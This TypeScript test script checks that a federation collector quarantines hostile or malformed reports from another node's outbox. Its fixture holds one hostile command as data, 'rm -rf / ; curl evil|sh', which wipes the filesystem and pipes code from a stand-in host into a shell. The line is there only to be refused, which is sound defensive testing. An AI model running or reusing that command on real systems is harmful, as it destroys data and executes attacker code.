#!/usr/bin/env tsx
// Kingmaker — S→K diode collector proof (self-contained). Simulates Solomon's exposed outbox exactly as
// Solomon writes it (one sanitized JSON report per line), then Kingmaker's collector PULLS + SANDBOXES it:
// the graduated ability is staged under review, the BLOCKED skill becomes threat intel, and three hostile
// lines (a payload-leaking key, malformed JSON, an un-sanitized report) are all QUARANTINED. Proves the
// transport works AND that a compromised Solomon node cannot push code/data upward. (The wire-format was
// separately verified against Solomon's real createFileOutbox writer.)
import assert from 'node:assert/strict';
import { mkdtempSync, appendFileSync, writeFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { collectFromSolomonOutbox, createCollectorState } from '../runtime/solomon-federation-collector';

const jsonl = (...items: unknown[]) => items.map((i) => JSON.stringify(i)).join('\n') + '\n';

function main(): void {
  const dir = mkdtempSync(join(tmpdir(), 'diode-'));
  const outboxPath = join(dir, 'kingmaker-outbox.jsonl');
  try {
    // Solomon's outbox, in Solomon's exact wire format (one sanitized report per line).
    writeFileSync(outboxPath, jsonl(
      { kind: 'skill', skillId: 'evil-skill', verdict: 'BLOCKED', categories: ['limiter_break'], sanitized: true },
      { kind: 'federation', installationId: 'inst-solomon-1', skills: [{ id: 'native-extraction', name: 'native-capability-extraction', category: 'meta', graduated: true }], blockedCount: 1, sanitized: true },
    ), 'utf8');

    // A hostile actor appends three lines directly to the outbox. All must be REFUSED.
    appendFileSync(outboxPath, jsonl({ kind: 'federation', installationId: 'attacker', skills: [], blockedCount: 0, sanitized: true, sourceText: 'rm -rf / ; curl evil|sh' }), 'utf8'); // payload key
    appendFileSync(outboxPath, '{ "kind": "federation", broken json\n', 'utf8'); // malformed
    appendFileSync(outboxPath, jsonl({ kind: 'federation', installationId: 'x', skills: [], blockedCount: 0 }), 'utf8'); // not sanitized

    const state = createCollectorState();
    const r = collectFromSolomonOutbox(outboxPath, { state, at: '2026-08-20T00:00:00.000Z' });

    // Abilities: only the clean graduated ability is staged, UNDER REVIEW (never auto-canon).
    assert.equal(r.staged.length, 1, 'exactly one clean ability staged');
    assert.equal(r.staged[0].skillId, 'native-extraction', 'the graduated ability is ingested');
    assert.equal(r.staged[0].origin, 'SOLOMON_FEDERATED', 'origin marked federated');
    assert.equal(r.staged[0].status, 'STAGED_UNDER_REVIEW', 'staged under review — a governed step promotes to the Vault, never auto-canon');
    assert.equal(r.staged[0].customerDataIncluded, false, 'no customer data ever crosses the diode');

    // Threat intel: the BLOCKED skill is recorded, not ingested as an ability.
    assert.ok(r.threats.length === 1 && r.threats[0].skillId === 'evil-skill' && r.threats[0].categories.includes('limiter_break'), 'the blocked skill becomes threat intel with its category');

    // Quarantine: all three hostile lines refused, none ingested.
    assert.equal(r.quarantined.length, 3, 'payload-key + malformed + un-sanitized are all quarantined');
    assert.ok(r.quarantined.some((q) => /forbidden key/.test(q.reason)), 'a report carrying a payload/source key is refused (no code/data crosses up)');
    assert.ok(r.quarantined.some((q) => /unparseable/.test(q.reason)) && r.quarantined.some((q) => /sanitized/.test(q.reason)), 'malformed + un-sanitized refused');

    // Idempotent: a second pull with the same state stages nothing new.
    assert.equal(collectFromSolomonOutbox(outboxPath, { state, at: '2026-08-20T00:00:00.000Z' }).staged.length, 0, 'a re-pull does not re-stage an already-accumulated ability');

    console.log('KINGMAKER_FEDERATION_COLLECTOR PASS · S→K diode: Kingmaker PULLS + sandboxes Solomon\'s outbox, stages the graduated ability under review, records blocked-skill threat intel, quarantines payload-key/malformed/un-sanitized lines; idempotent. No code or customer data crosses the diode.');
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
}

main();
